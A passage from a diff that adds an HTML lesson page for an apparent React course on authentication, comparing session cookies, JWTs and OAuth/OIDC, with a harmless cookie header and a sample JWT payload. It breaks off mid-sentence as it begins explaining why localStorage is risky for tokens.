@@ -1,0 +1,971 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<script>
+  (function () {
+    try {
+      var saved = localStorage.getItem("cvc-theme");
+      var theme = saved || (window.matchMedia("(prefers-color-scheme: light)").matches ? "light" : "dark");
+      document.documentElement.setAttribute("data-theme", theme);
+    } catch (err) {
+      document.documentElement.setAttribute("data-theme", "dark");
+    }
+  })();
+</script>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Week 25: Security, Authentication &amp; Authorization — CodeVerse Creatives</title>
+<meta name="description" content="Week 25 of the React curriculum: session vs. JWT vs. OAuth/OIDC auth flows, token storage tradeoffs, protected routes with role-based access control, and preventing XSS/CSRF in React apps." />
+<link rel="icon" href="../../assets/favicons/favicon.svg" type="image/svg+xml" />
+<link rel="icon" href="../../assets/favicons/favicon.ico" sizes="any" />
+<link rel="icon" href="../../assets/favicons/favicon-32x32.png" sizes="32x32" type="image/png" />
+<link rel="icon" href="../../assets/favicons/favicon-16x16.png" sizes="16x16" type="image/png" />
+<link rel="apple-touch-icon" href="../../assets/favicons/apple-touch-icon.png" />
+<link rel="manifest" href="../../assets/favicons/site.webmanifest" />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="../../css/style.css" />
+</head>
+<body data-course="react">
+<svg width="0" height="0" style="position:absolute" aria-hidden="true" focusable="false">
+  <defs>
+    <linearGradient id="brandGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" style="stop-color:var(--accent)" />
+      <stop offset="100%" style="stop-color:var(--accent-2)" />
+    </linearGradient>
+  </defs>
+</svg>
+
+<header class="navbar" data-navbar>
+  <div class="container navbar__inner">
+    <a href="../../index.html" class="brand">
+      <svg class="brand__mark" viewBox="0 0 100 100" aria-hidden="true" focusable="false"><rect width="100" height="100" rx="22" fill="url(#brandGrad)"/><path d="M 46 28 L 22 50 L 46 72" fill="none" stroke="#fff" stroke-width="10" stroke-linecap="round" stroke-linejoin="round"/><path d="M 54 28 L 78 50 L 54 72" fill="none" stroke="#fff" stroke-width="10" stroke-linecap="round" stroke-linejoin="round"/><circle cx="50" cy="50" r="6.5" fill="#fff"/></svg>
+      CodeVerse Creatives
+    </a>
+
+    <nav class="nav-links" data-nav-links>
+      <a href="../../index.html">Home</a>
+      <div class="nav-dropdown" data-nav-dropdown data-active="true">
+        <button type="button" class="nav-dropdown__trigger" data-nav-dropdown-trigger aria-haspopup="true" aria-expanded="false">
+          Courses
+          <svg class="nav-dropdown__chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
+        </button>
+        <div class="nav-dropdown__panel" data-nav-dropdown-panel>
+          <a href="../angular/index.html" class="nav-course-card c-angular">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">Angular</span>
+              <span class="nav-course-card__meta">34 Weeks</span>
+            </span>
+          </a>
+          <a href="../cybersecurity/index.html" class="nav-course-card c-cybersecurity">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10Z"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">Cybersecurity Basics</span>
+              <span class="nav-course-card__meta">16 Weeks</span>
+            </span>
+          </a>
+          <a href="../devops-cloud/index.html" class="nav-course-card c-devops-cloud">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.5 19H9a5 5 0 1 1 .87-9.92A6 6 0 0 1 21 11a4 4 0 0 1-.5 8Z"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">DevOps &amp; Cloud</span>
+              <span class="nav-course-card__meta">26 Weeks</span>
+            </span>
+          </a>
+          <a href="../dsa-cpp/index.html" class="nav-course-card c-dsa-cpp">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="5" cy="6" r="2.5"/><circle cx="19" cy="6" r="2.5"/><circle cx="12" cy="13" r="2.5"/><circle cx="5" cy="20" r="2.5"/><circle cx="19" cy="20" r="2.5"/><path d="M6.8 7.8 10.2 11.2M17.2 7.8 13.8 11.2M10.2 14.8 6.8 18.2M13.8 14.8 17.2 18.2"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">DSA in C++</span>
+              <span class="nav-course-card__meta">20 Weeks</span>
+            </span>
+          </a>
+          <a href="../github/index.html" class="nav-course-card c-github">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="6" y1="3" x2="6" y2="15"/><circle cx="18" cy="6" r="3"/><circle cx="6" cy="18" r="3"/><path d="M18 9a9 9 0 0 1-9 9"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">Git &amp; GitHub</span>
+              <span class="nav-course-card__meta">5 Weeks</span>
+            </span>
+          </a>
+          <a href="../javascript-typescript/index.html" class="nav-course-card c-javascript-typescript">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8 3H7a2 2 0 0 0-2 2v5a2 2 0 0 1-2 2 2 2 0 0 1 2 2v5a2 2 0 0 0 2 2h1"/><path d="M16 3h1a2 2 0 0 1 2 2v5a2 2 0 0 0 2 2 2 2 0 0 0-2 2v5a2 2 0 0 1-2 2h-1"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">JavaScript &amp; TypeScript</span>
+              <span class="nav-course-card__meta">14 Weeks</span>
+            </span>
+          </a>
+          <a href="../llm-ml/index.html" class="nav-course-card c-llm-ml">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="4" width="16" height="16" rx="2"/><path d="M9 9h6v6H9z"/><path d="M4 9H2M4 15H2M22 9h-2M22 15h-2M9 4V2M15 4V2M9 22v-2M15 22v-2"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">AI &amp; ML</span>
+              <span class="nav-course-card__meta">26 Weeks</span>
+            </span>
+          </a>
+          <a href="../artificial-intelligence/index.html" class="nav-course-card c-artificial-intelligence">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="8" width="14" height="11" rx="2"/><path d="M12 8V5"/><circle cx="12" cy="4" r="1"/><circle cx="9.5" cy="13" r="1"/><circle cx="14.5" cy="13" r="1"/><path d="M9.5 16.5h5M3 12v3M21 12v3"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">Artificial Intelligence</span>
+              <span class="nav-course-card__meta">19 Weeks</span>
+            </span>
+          </a>
+          <a href="../machine-learning/index.html" class="nav-course-card c-machine-learning">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="5" cy="12" r="2"/><circle cx="12" cy="5" r="2"/><circle cx="12" cy="19" r="2"/><circle cx="19" cy="12" r="2"/><path d="m6.5 10.5 4-4M6.5 13.5l4 4M13.5 6.5l4 4M13.5 17.5l4-4"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">Machine Learning</span>
+              <span class="nav-course-card__meta">10 Weeks</span>
+            </span>
+          </a>
+          <a href="../data-science/index.html" class="nav-course-card c-data-science">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 3v18h18"/><path d="m7 15 4-4 3 3 5-6"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">Data Science</span>
+              <span class="nav-course-card__meta">10 Weeks</span>
+            </span>
+          </a>
+          <a href="../node-express/index.html" class="nav-course-card c-node-express">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 21 6.5 21 15.5 12 20 3 15.5 3 6.5 12 2"/><path d="M9 9.5c1.5-1 3.5-1 5 0M8 13c2 1.5 6 1.5 8 0"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">Node.js &amp; Express</span>
+              <span class="nav-course-card__meta">26 Weeks</span>
+            </span>
+          </a>
+          <a href="../aptitude/index.html" class="nav-course-card c-aptitude">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="3" width="16" height="18" rx="2"/><line x1="8" y1="7" x2="16" y2="7"/><line x1="8" y1="12" x2="8" y2="12"/><line x1="12" y1="12" x2="12" y2="12"/><line x1="16" y1="12" x2="16" y2="12"/><line x1="8" y1="16" x2="8" y2="16"/><line x1="12" y1="16" x2="12" y2="16"/><line x1="16" y1="16" x2="16" y2="16"/><line x1="8" y1="20" x2="8" y2="20"/><line x1="12" y1="20" x2="12" y2="20"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">Numerical Aptitude</span>
+              <span class="nav-course-card__meta">21 Weeks</span>
+            </span>
+          </a>
+          <a href="../php/index.html" class="nav-course-card c-php">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 15c0-4.5 3.4-8 8-8s8 3.5 8 8v1a2 2 0 0 1-2 2h-1"/><path d="M18 16v3a2 2 0 0 1-2 2"/><path d="M6 18v3M10 19v3M14 19v3"/><circle cx="7.5" cy="12" r=".6" fill="currentColor"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">PHP</span>
+              <span class="nav-course-card__meta">32 Weeks</span>
+            </span>
+          </a>
+          <a href="../python/index.html" class="nav-course-card c-python">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2c-2 0-4 .5-4 2v3h4v1H6c-1.5 0-3 1-3 4s1.5 4 3 4h2v-2.5c0-1.5 1-2.5 2.5-2.5h4c1 0 2-1 2-2V4c0-1.5-2-2-4.5-2Z"/><path d="M12 22c2 0 4-.5 4-2v-3h-4v-1h6c1.5 0 3-1 3-4s-1.5-4-3-4h-2v2.5c0 1.5-1 2.5-2.5 2.5h-4c-1 0-2 1-2 2v4c0 1.5 2 2 4.5 2Z"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">Python</span>
+              <span class="nav-course-card__meta">26 Weeks</span>
+            </span>
+          </a>
+          <a href="../react/index.html" class="nav-course-card c-react" aria-current="page">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="2.5"/><ellipse cx="12" cy="12" rx="10" ry="4.2"/><ellipse cx="12" cy="12" rx="10" ry="4.2" transform="rotate(60 12 12)"/><ellipse cx="12" cy="12" rx="10" ry="4.2" transform="rotate(120 12 12)"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">React</span>
+              <span class="nav-course-card__meta">28 Weeks</span>
+            </span>
+          </a>
+          <a href="../react-native/index.html" class="nav-course-card c-react-native">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="6" y="2" width="12" height="20" rx="2"/><line x1="10" y1="19" x2="14" y2="19"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">React Native</span>
+              <span class="nav-course-card__meta">22 Weeks</span>
+            </span>
+          </a>
+          <a href="../servicenow/index.html" class="nav-course-card c-servicenow">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 8a2 2 0 0 1 2-2h2a2 2 0 0 0 4 0h6a2 2 0 0 1 2 2v2a2 2 0 0 0 0 4v2a2 2 0 0 1-2 2h-6a2 2 0 0 0-4 0H5a2 2 0 0 1-2-2v-2a2 2 0 0 0 0-4V8Z"/><path d="m9 12 2 2 4-4"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">ServiceNow</span>
+              <span class="nav-course-card__meta">26 Weeks</span>
+            </span>
+          </a>
+          <a href="../spring-boot/index.html" class="nav-course-card c-spring-boot">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="6" rx="1"/><rect x="2" y="15" width="20" height="6" rx="1"/><path d="M6 6h.01M6 18h.01"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">Spring Boot</span>
+              <span class="nav-course-card__meta">26 Weeks</span>
+            </span>
+          </a>
+          <a href="../system-design/index.html" class="nav-course-card c-system-design">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 2 7 12 12 22 7 12 2"/><polyline points="2 17 12 22 22 17"/><polyline points="2 12 12 17 22 12"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">System Design</span>
+              <span class="nav-course-card__meta">28 Weeks</span>
+            </span>
+          </a>
+          <a href="../mongodb/index.html" class="nav-course-card c-mongodb">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M3 5v14c0 1.7 4 3 9 3s9-1.3 9-3V5"/><path d="M3 12c0 1.7 4 3 9 3s9-1.3 9-3"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">MongoDB</span>
+              <span class="nav-course-card__meta">10 Weeks</span>
+            </span>
+          </a>
+          <a href="../data-analytics/index.html" class="nav-course-card c-data-analytics">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="20" x2="18" y2="10"/><line x1="12" y1="20" x2="12" y2="4"/><line x1="6" y1="20" x2="6" y2="14"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">Excel, SQL &amp; Power BI</span>
+              <span class="nav-course-card__meta">12 Weeks</span>
+            </span>
+          </a>
+          <a href="../golang/index.html" class="nav-course-card c-golang">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">Go</span>
+              <span class="nav-course-card__meta">16 Weeks</span>
+            </span>
+          </a>
+          <a href="../flutter/index.html" class="nav-course-card c-flutter">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2 3 12l4 4L21 2h-8Z"/><path d="M13 22 7 16l4-4 4 4-4 4Z"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">Flutter</span>
+              <span class="nav-course-card__meta">20 Weeks</span>
+            </span>
+          </a>
+          <a href="../coding-practice/index.html" class="nav-course-card c-coding-practice">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="2" width="6" height="4" rx="1"/><path d="M9 4H6a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2h-3"/><path d="m9 14 2 2 4-4"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">Coding Practice</span>
+              <span class="nav-course-card__meta">120 Problems</span>
+            </span>
+          </a>
+          <a href="../docker-kubernetes/index.html" class="nav-course-card c-docker-kubernetes">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><polyline points="3.27 6.96 12 12.01 20.73 6.96"/><line x1="12" y1="22.08" x2="12" y2="12"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">Docker &amp; Kubernetes</span>
+              <span class="nav-course-card__meta">18 Weeks</span>
+            </span>
+          </a>
+                  <a href="../sql-postgresql/index.html" class="nav-course-card c-sql-postgresql">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2"/><line x1="3" y1="9" x2="21" y2="9"/><line x1="3" y1="15" x2="21" y2="15"/><line x1="9" y1="3" x2="9" y2="21"/><line x1="15" y1="3" x2="15" y2="21"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">SQL &amp; PostgreSQL</span>
+              <span class="nav-course-card__meta">10 Weeks</span>
+            </span>
+          </a>
+          <a href="../claude/index.html" class="nav-course-card c-claude">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3c0 4.5 2.5 7 7 7-4.5 0-7 2.5-7 7 0-4.5-2.5-7-7-7 4.5 0 7-2.5 7-7Z"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">Claude</span>
+              <span class="nav-course-card__meta">14 Weeks</span>
+            </span>
+          </a>
+          <a href="../ugc-net-cse/index.html" class="nav-course-card c-ugc-net-cse">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 10 12 5 2 10l10 5 10-5Z"/><path d="M6 12v5c0 1.5 3 3 6 3s6-1.5 6-3v-5"/><path d="M22 10v6"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">UGC NET Computer Science</span>
+              <span class="nav-course-card__meta">7 of 19 Weeks</span>
+            </span>
+          </a>
+          <a href="../kannada/index.html" class="nav-course-card c-kannada">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/><line x1="7" y1="9" x2="15" y2="9"/><line x1="7" y1="13" x2="12" y2="13"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">Kannada Language</span>
+              <span class="nav-course-card__meta">12 Weeks</span>
+            </span>
+          </a>
+          <a href="../distributed-systems/index.html" class="nav-course-card c-distributed-systems">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="5" r="2.5"/><circle cx="5" cy="19" r="2.5"/><circle cx="19" cy="19" r="2.5"/><path d="M10.8 7.2 6.2 16.8M13.2 7.2l4.6 9.6M7.5 19h9"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">Distributed Systems</span>
+              <span class="nav-course-card__meta">16 Weeks</span>
+            </span>
+          </a>
+          <a href="../oracle-netsuite/index.html" class="nav-course-card c-oracle-netsuite">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12.83 2.18a2 2 0 0 0-1.66 0L2.6 6.08a1 1 0 0 0 0 1.83l8.58 3.91a2 2 0 0 0 1.66 0l8.58-3.9a1 1 0 0 0 0-1.83Z"/><path d="m22 12.5-8.58 3.9a2 2 0 0 1-1.66 0L3.18 12.5"/><path d="m22 17.5-8.58 3.9a2 2 0 0 1-1.66 0L3.18 17.5"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">Oracle NetSuite</span>
+              <span class="nav-course-card__meta">1 of 26 Weeks</span>
+            </span>
+          </a>
+        </div>
+      </div>
+    </nav>
+
+    <div class="navbar__actions">
+      <div class="nav-search" data-nav-search>
+        <button type="button" class="search-toggle" data-search-toggle aria-label="Search courses" aria-expanded="false" title="Search courses (press /)">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+        </button>
+        <div class="search-panel" data-search-panel>
+          <div class="search-panel__field">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+            <input type="search" class="search-panel__input" data-search-input placeholder="Search courses&hellip;" aria-label="Search courses" autocomplete="off" />
+            <kbd class="search-panel__kbd">Esc</kbd>
+          </div>
+          <div class="search-panel__results" data-search-results></div>
+        </div>
+      </div>
+      <button class="theme-toggle" data-theme-toggle aria-label="Toggle color theme">
+        <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79Z"/></svg>
+        <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41"/></svg>
+      </button>
+      <button class="nav-toggle" data-nav-toggle aria-label="Toggle navigation menu">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h18M3 12h18M3 18h18"/></svg>
+      </button>
+    </div>
+  </div>
+</header>
+
+<main>
+  <!-- Lesson header -->
+  <section class="lesson-header">
+    <div class="container">
+      <div class="lesson-crumb">
+        <a href="../react/index.html">React Syllabus</a>
+        <span>/</span>
+        <a href="../react/index.html#timeline">Module 15 · Security &amp; Authentication</a>
+        <span>/</span>
+        <span aria-current="page">Week 25</span>
+      </div>
+
+      <h1>Week 25: Security, Authentication &amp; Authorization</h1>
+      <p class="lesson-header__lede">
+        Week 7's protected routes assumed the hard part was already solved — an <code>isLoggedIn</code>
+        flag just existed, and <code>RequireAuth</code> read it. This week builds the real thing
+        underneath that flag: how a browser and a server actually agree that a user is who they say
+        they are, where it's safe to keep the proof of that agreement, and how to stop a React app
+        from being trivially exploitable by the two attacks that target it most: XSS and CSRF.
+      </p>
+
+      <div class="lesson-meta">
+        <span class="chip chip--accent">Module 15 of 17</span>
+        <span class="chip">Week 25 of 28</span>
+        <span class="chip">~3–4 Hours</span>
+        <span class="chip">Hands-on Exercise Included</span>
+      </div>
+
+      <div class="obj-recap reveal">
+        <h2>By the end of this week, you'll be able to</h2>
+        <ul>
+          <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>Explain the tradeoffs between session-cookie, JWT, and OAuth/OIDC auth flows and pick the right one for a given app</li>
+          <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>Store auth tokens securely, and explain why <code>localStorage</code> is usually the wrong answer</li>
+          <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>Protect routes with role-based access control and prevent the most common React-specific XSS/CSRF mistakes</li>
+        </ul>
+      </div>
+
+      <div class="phase-nav">
+        <a href="#auth-flows"><span>1</span> Auth Flows: Session vs. JWT vs. OAuth/OIDC</a>
+        <a href="#token-storage"><span>2</span> Token Storage Tradeoffs</a>
+        <a href="#protected-routes-rbac"><span>3</span> Protected Routes &amp; RBAC</a>
+        <a href="#xss-prevention"><span>4</span> XSS Prevention &amp; Sanitizing Content</a>
+        <a href="#csrf-secure-api"><span>5</span> CSRF &amp; Secure API Calls</a>
+        <a href="#exercise"><span>6</span> Exercise</a>
+        <a href="#quiz"><span>7</span> Knowledge Check</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- Lesson body -->
+  <section class="section section--tight">
+    <div class="container">
+      <div class="lesson-layout">
+        <article class="lesson-article">
+
+          <section id="auth-flows">
+            <h2>1. Auth Flows: Session vs. JWT vs. OAuth/OIDC</h2>
+            <p>
+              "Authentication" isn't one thing — it's a family of different mechanisms for the same
+              underlying handshake: prove who you are once, then get treated as that identity on
+              every request afterward without re-proving it each time. Three flows cover the vast
+              majority of real apps, and each makes a different tradeoff.
+            </p>
+
+            <ul>
+              <li><strong>Server session + cookie</strong> — the server generates a random session ID on login, stores the session's data (user ID, roles) in its own store (Redis, a database table), and sends the browser only the ID, in a cookie. Every request, the browser automatically attaches that cookie, and the server looks the session up. Simple to reason about, and revoking access is instant — delete the row. The cost: the server has to keep state for every logged-in user, which complicates scaling across multiple server instances unless the session store is shared.</li>
+              <li><strong>JWT (JSON Web Token)</strong> — the server signs a token containing the user's identity and claims directly, and hands the whole token to the client. Any server holding the same signing secret can verify it without a database lookup — genuinely <strong>stateless</strong>, which scales trivially across instances. The cost: a JWT is valid until it expires, full stop. There's no "delete the row" — revoking a single compromised token before its expiry requires extra machinery (a denylist, short expiries plus refresh tokens) that reintroduces some of the state you were trying to avoid.</li>
+              <li><strong>OAuth 2.0 / OpenID Connect (OIDC)</strong> — you don't verify credentials at all. The user authenticates with a third party (Google, GitHub, Auth0, Okta), and that party hands your app a token vouching for who the user is (OIDC layers "identity" on top of OAuth's "authorization"). Right for when you don't want to own passwords, want a faster signup flow, or need to act on a user's behalf against a third-party API (reading their Google Calendar, for instance).</li>
+            </ul>
+
+            <div class="code-block">
+              <div class="code-block__label">example — session login response (server sets the cookie)</div>
+              <pre><code>POST /api/login
+Set-Cookie: session_id=8f3e...c1a; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=604800
+
+{ "user": { "id": 42, "name": "Priya" } } // no token in the JSON body at all
+</code></pre>
+            </div>
+
+            <div class="code-block">
+              <div class="code-block__label">example — decoded JWT payload (never store secrets here — it's readable, not encrypted)</div>
+              <pre><code>{
+  "sub": "42",
+  "name": "Priya",
+  "role": "editor",
+  "iat": 1735689600, // issued at
+  "exp": 1735693200  // expires 1 hour later
+}
+</code></pre>
+            </div>
+
+            <p>
+              That last point about JWTs is easy to miss: a JWT's payload is <strong>base64-encoded,
+              not encrypted</strong>. Anyone holding the token — including the user themselves,
+              via their browser dev tools — can read every claim inside it. The signature only
+              proves the server issued it unmodified; it proves nothing about secrecy.
+            </p>
+
+            <div class="callout callout--tip">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a7 7 0 0 0-4 12.7V17a2 2 0 0 0 2 2h4a2 2 0 0 0 2-2v-2.3A7 7 0 0 0 12 2Z"/><path d="M9 21h6"/></svg>
+              <div>
+                <strong>Picking one</strong>
+                <p>Single backend, want instant revocation and simplicity: server sessions. Multiple independently-scaled services that all need to verify identity without a shared session store: JWT. Don't want to own credential storage, or need delegated access to a third-party API: OAuth/OIDC. Plenty of real apps combine two — OIDC for login, then a short-lived session cookie for everything after.</p>
+              </div>
+            </div>
+          </section>
+
+          <section id="token-storage">
+            <h2>2. Token Storage Tradeoffs</h2>
+            <p>
+              Choosing an auth flow answers "how do we prove identity." A separate, equally
+              important question: once you have a token or session ID, <strong>where does it live
+              in the browser</strong>? Get this wrong and the flow you chose in Section 1 stops
+              mattering.
+            </p>
+
+            <p>
+              <code>localStorage</code> is the option that looks convenient and is usually the wrong
+              answer. It's plain JavaScript-readable storage — which means <strong>any script running
+              on your page can read it</strong>, including a script that shouldn't be there at all.
+              If your app has even one XSS vulnerability (Section 4) — a single unsanitized
